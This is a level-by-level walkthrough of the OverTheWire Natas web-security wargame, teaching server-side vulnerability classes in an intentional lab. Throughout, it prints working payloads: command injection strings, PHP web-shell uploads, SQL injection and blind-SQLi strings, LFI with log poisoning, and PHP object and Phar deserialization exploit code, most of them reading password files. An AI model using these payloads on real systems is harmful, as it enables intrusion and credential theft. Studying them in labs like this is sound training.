# OverTheWire — Natas Writeup

My walkthrough of all 34 levels (0 → 34) of [OverTheWire: Natas](https://overthewire.org/wargames/natas), the wargame that teaches server-side web security — from trivial source-code leaks all the way up to PHP object injection and Phar deserialization.

**A note on passwords:** Following OverTheWire's own guidance, I don't publish level passwords — it spoils the challenge for others. This writeup documents the vulnerability class, the mechanism, and the exploit approach for each level. Run the techniques yourself to recover each password. Placeholders like `<natasN-password>` stand in for the credential you carry from the previous level.

## How it works

Each level is a separate website at `http://natasN.natas.labs.overthewire.org`. You log in over HTTP Basic Auth with username `natasN` and the password you found on the previous level. Every level's goal is to recover the password for the next one, which lives on the server at `/etc/natas_webpass/natasN+1`. Start: `natas0` / `natas0`.

A proxy like Burp Suite, plus `curl` and a bit of Python (requests) for the scripted levels, is all you need.

## Levels

### Level 0 — View source

The password is sitting in an HTML comment on the page. View source.

### Level 0 → 1 — View source (right-click disabled)

JavaScript blocks the context menu, but that's cosmetic. Use `Ctrl+U` / `Cmd+Opt+U` or `view-source:` to read the comment.

### Level 1 → 2 — Directory listing

The page embeds `<img src="files/pixel.png">`. Browse to `/files/` — directory listing is enabled — and open `users.txt`.

### Level 2 → 3 — robots.txt

The page hints that "not even Google will find it." Check `/robots.txt`, which disallows `/s3cr3t/`. Browse `/s3cr3t/users.txt`.

### Level 3 → 4 — Referer header spoofing

The app insists you came from `http://natas5.natas.labs.overthewire.org/`. It only checks the `Referer` header, which the client controls. Send it yourself:

```bash
curl -u natas4:<natas4-password> \
  -H "Referer: http://natas5.natas.labs.overthewire.org/" \
  http://natas4.natas.labs.overthewire.org/
```

### Level 4 → 5 — Cookie manipulation

"You are not logged in." The response sets `loggedin=0`. Change the cookie to `loggedin=1` and reload.

### Level 5 → 6 — Source/include disclosure

A form asks for a secret. The source shows `include "includes/secret.inc"`. Browse to `/includes/secret.inc` to read the hard-coded secret, then submit it.

### Level 6 → 7 — Local File Inclusion (path traversal)

Links look like `index.php?page=home`. The `page` parameter is included with no sanitisation, so point it at the password file:

```
index.php?page=/etc/natas_webpass/natas8
```

### Level 7 → 8 — Reversible encoding

The secret is stored as `bin2hex(strrev(base64_encode($secret)))`. Reverse each step to recover the plaintext secret:

```python
import base64
enc = "<hex-string-from-source>"
print(base64.b64decode(bytes.fromhex(enc)[::-1]))
```

### Level 8 → 9 — Command injection (unfiltered)

Input is dropped straight into `passthru("grep -i $key dictionary.txt")`. Inject a second command:

```
; cat /etc/natas_webpass/natas10
```

### Level 9 → 10 — Command injection (filter bypass)

Same `grep`, but `;`, `|`, `&` are now blocked. No shell metacharacters needed — abuse `grep` itself. A regex that matches anything plus a second file argument dumps the password file:

```
.* /etc/natas_webpass/natas11
```

### Level 10 → 11 — XOR cookie, known-plaintext attack

Settings are stored in a cookie as `base64(xor_encrypt(json))`. The key is unknown, but you know the plaintext JSON. Since `ciphertext XOR plaintext = key`, recover the repeating key, flip `showpassword` to `yes`, re-encrypt, and set the new cookie.

```python
# key = cookie_plaintext XOR cookie_ciphertext  (then reuse to encrypt the tampered JSON)
```

### Level 11 → 12 — File upload (extension)

A drawing uploader renames files to `.jpg` via a hidden form field. Intercept the upload in Burp, change the extension to `.php`, and upload a payload:

```php
<?php echo system("cat /etc/natas_webpass/natas13"); ?>
```

Then browse to the returned path.

### Level 12 → 13 — File upload (magic-byte bypass)

Same uploader, now guarded by `exif_imagetype()`. Prepend valid image magic bytes so the file passes the check while still executing as PHP:

```php
BMP<?php echo system("cat /etc/natas_webpass/natas14"); ?>
```

Keep the `.php` extension via Burp as before.

### Level 13 → 14 — SQL injection (auth bypass)

Login query concatenates input directly. Make the `WHERE` clause always true:

```
username: " OR 1=1 #
```

### Level 14 → 15 — Boolean-blind SQL injection

A "check user" form only tells you exists / doesn't exist — no data. Leak the password one character at a time with a case-sensitive `LIKE BINARY`:

```sql
natas16" AND password LIKE BINARY "a%
```

Script it across the charset until you've recovered all 32 characters.

### Level 15 → 16 — Blind command injection (command substitution)

`grep` again, with more characters filtered — but `$`, `(`, `)` survive. You can't exfiltrate directly, but you can get a boolean oracle: inject a nested `grep` whose match changes whether the outer search returns results.

```
$(grep -E ^a.* /etc/natas_webpass/natas17)
```

Use response size as the true/false signal and brute-force char by char.

### Level 16 → 17 — Time-based blind SQL injection

Identical to level 14's blind SQLi, except the page now returns nothing at all. Switch your oracle from page content to response time using `SLEEP()`:

```sql
natas18" AND password LIKE BINARY "a%" AND SLEEP(5)-- 
```

A slow response means the guessed character is correct.

### Level 17 → 18 — Session ID brute force (sequential)

Admin sessions use `PHPSESSID` values from 1–640. Loop through every value, send each as the cookie, and stop when the page returns admin credentials.

```python
for sid in range(1, 641):
    r = s.get(url, cookies={"PHPSESSID": str(sid)})
    if "regular user" not in r.text: break
```

### Level 18 → 19 — Session ID brute force (predictable encoding)

"IDs are no longer sequential." Decode your cookie — it's hex for `<number>-admin`. The format is still predictable, so brute-force the numeric part with the `admin` suffix:

```python
val = binascii.hexlify(f"{n}-admin".encode())
```

### Level 19 → 20 — Session handler injection (newline)

A custom session writer serialises each key/value as `"$key $value\n"`. Inject a newline into your name to smuggle in a second session variable:

```
?debug&name=admin%0Aadmin%201
```

That writes `admin 1` into your session file → you become admin.

### Level 20 → 21 — Shared session / mass assignment

Two sites share a session. The main site only checks `admin == 1`; the "experimenter" site blindly copies every submitted parameter into the session. Set `admin=1` there, then reuse that `PHPSESSID` on the main site:

```
http://natas21-experimenter.natas.labs.overthewire.org/?submit&admin=1
```

### Level 21 → 22 — Forced-redirect bypass

The password only prints when `revelio` is set, but the page issues a `Location:` redirect first. Add the parameter and don't follow the redirect — the body is already sent.

```bash
curl -u natas22:<natas22-password> \
  "http://natas22.natas.labs.overthewire.org/?revelio=1"
```

### Level 22 → 23 — PHP loose comparison

The check is `strstr($passwd,"iloveyou") && $passwd > 10`. `strstr` only needs the substring present, and a leading number makes the numeric comparison pass:

```
passwd=11iloveyou
```

### Level 23 → 24 — strcmp() array bypass

Auth hinges on `strcmp($passwd, $secret) == 0`. Passing an array makes `strcmp` return `NULL`, which loosely equals `0`:

```
?passwd[]=
```

### Level 24 → 25 — LFI filter bypass + log poisoning

The `lang` include strips `../`, but `....//` collapses back to `../` after replacement, restoring traversal. Combine that with the fact that your User-Agent is written into a per-session log file:

1. Note your `session_id` (from the cookie).
2. Put PHP in your User-Agent: `<?php include '/etc/natas_webpass/natas26'; ?>`
3. Include your own log file via `lang` using the traversal bypass.

The injected PHP runs when the log is included, printing the password.

### Level 25 → 26 — PHP object injection

An unused `Logger` class has a `__destruct()` that writes to an attacker-influenced file path, and you control the serialised `drawing` cookie passed to `unserialize()`. Forge a `Logger` object whose log file is a `.php` path under the web-readable `img/` directory and whose message is a PHP payload:

```php
class Logger {
    private $logFile = "img/pwn.php";
    private $initMsg = "x";
    private $exitMsg = "<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>";
}
echo base64_encode(serialize(new Logger()));
```

Set that as the `drawing` cookie, then browse to `img/pwn.php`.

### Level 26 → 27 — SQL truncation

The `users` table caps `username` at `varchar(64)`. Register `natas28` padded with enough trailing spaces to exceed 64 characters (plus a trailing char so the uniqueness check passes). MySQL silently truncates on insert, creating a second `natas28` row with a password you control. Log in as `natas28` with that password to read the real account's data.

```
username: natas28<57 spaces>x
```

### Level 27 → 28 — AES-ECB cut-and-paste injection

The search query is AES-ECB encrypted (16-byte blocks, each encrypted independently) with input sanitisation applied before encryption. Because identical plaintext blocks produce identical ciphertext blocks, you can craft input so the escaping backslash lands at the end of one block while your `'` starts the next, then splice ciphertext blocks to assemble a clean SQL injection the sanitiser never sees:

```sql
' UNION ALL SELECT password FROM users; #
```

Script it: capture a baseline (header/footer blocks), encrypt the payload, and reassemble the blocks.

### Level 28 → 29 — Perl command injection via open()

The page is now Perl. `index.pl?file=...` feeds input into `open(FD, "$f.txt")`, and Perl's 2-argument `open` treats a leading/trailing `|` as a command pipe:

```
index.pl?file=|cat+index.pl%00
```

The source filters the keyword `natas`, so break it up to dodge the filter:

```
index.pl?file=|cat+/etc/na""tas_webpass/nat""as30%00
```

### Level 29 → 30 — Perl DBI array injection

Login uses `$dbh->quote()`, which safely escapes strings — but if you pass an array, Perl's list context defeats it. Submit the password parameter as a list to inject:

```python
args = {"username": "natas31", "password": ["' or 1", 2]}
```

### Level 30 → 31 — Perl ARGV / diamond-operator RCE

A CSV uploader loops with `while (<$file>)`. If the uploaded file's name is `ARGV`, Perl's diamond operator reads from command-line arguments and will `open()` them — and a trailing `|` turns an argument into a command. Send the request to `index.pl?|<command>|` with a multipart part named `file` whose body is literally `ARGV`. (See The Perl Jam 2 for the full mechanism.)

### Level 31 → 32 — Perl ARGV RCE → setuid binary

Identical code to level 30, but the goal shifts: list the webroot, find the setuid `getpassword` binary, and execute it through the same ARGV trick:

```
POST /index.pl?/bin/ls%20-al%20.%20|      # discover getpassword
POST /index.pl?./getpassword%20|          # run it
```

### Level 32 → 33 — Phar deserialization

An uploader instantiates an `Executor` whose `__destruct()` runs `passthru("php " . $filename)` if `md5_file($filename) == $signature`. You can't collide MD5, but `md5_file()` accepts a `phar://` path, and Phar archives unserialize their metadata on access. Craft a Phar whose metadata is an `Executor` object with `signature = True` (so the loose `==` check always passes) and `filename` pointing at a PHP payload you uploaded separately:

```php
// build the phar (php -d phar.readonly=0)
class Executor { private $filename="pwn.php"; private $signature=true; private $init=false; }
$p = new Phar("test.phar");
$p->startBuffering();
$p->addFromString("test.txt", "x");
$p->setStub("<?php __HALT_COMPILER(); ?>");
$p->setMetadata(new Executor());
$p->stopBuffering();
```

Upload `pwn.php` (`<?php echo shell_exec('cat /etc/natas_webpass/natas34'); ?>`), upload the Phar, then set `filename=phar://test.phar/test.txt` to trigger the deserialization and run your payload.

### Level 33 → 34 — The end

`Congratulations! You have reached the end... for now.` 🎉

## Vulnerability classes covered

- **Information disclosure:** source comments, directory listing, `robots.txt`, exposed includes
- **Client-trust failures:** `Referer` spoofing, cookie tampering, client-side filename/extension control
- **Local File Inclusion & path traversal**, including filter-bypass (`....//`) and log poisoning
- **Command injection:** direct, filter-bypass via `grep`, and blind via command substitution
- **SQL injection:** auth bypass, boolean-blind, time-based blind, SQL truncation, and ECB cut-and-paste injection
- **Crypto flaws:** XOR known-plaintext recovery, ECB block manipulation
- **Weak/predictable sessions:** sequential and encoded session-ID brute force, session-handler newline injection, shared-session mass assignment
- **PHP type juggling:** `strstr`/numeric-string comparison, `strcmp` array bypass
- **Deserialization:** PHP object injection and Phar deserialization to RCE
- **Perl-specific bugs:** `open()` pipe injection, `DBI->quote()` array injection, `ARGV`/diamond-operator RCE

---

Part of my [OverTheWire](https://overthewire.org/wargames/) series. Bandit done; Leviathan, Krypton, and Narnia to follow.
